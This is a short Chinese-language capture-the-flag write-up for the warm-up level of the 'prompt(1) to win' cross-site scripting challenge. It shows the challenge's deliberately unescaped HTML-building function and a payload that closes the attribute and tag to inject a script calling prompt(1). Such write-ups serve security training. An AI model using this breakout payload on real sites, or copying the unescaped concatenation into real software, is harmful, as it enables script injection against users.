## [[prompt(1) to win](http://prompt.ml)] [[Level 0 - warm up](http://prompt.ml/0)] [[解题报告](https://exp-blog.com/safe/ctf/prompt/level-0-warm-up/)]

------

## 题目

```javascript
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}
```

------

## 解题报告

水题。直接闭合双引号和标签即可注入。

payload : `"><script>prompt(1)</script>`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2000%20-%20warm%20up/imgs/01.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
